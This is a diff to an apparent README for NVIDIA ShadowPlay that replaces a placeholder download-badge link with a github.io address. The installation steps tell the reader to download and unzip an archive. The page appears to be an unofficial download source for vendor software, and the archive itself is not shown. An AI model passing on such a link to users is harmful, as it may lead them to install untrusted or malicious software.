@@ -8,7 +8,7 @@ Whether you want to save your best moments or share them online, ShadowPlay prov
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://shadowplay-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Install **GeForce Experience** on your Windows PC.  
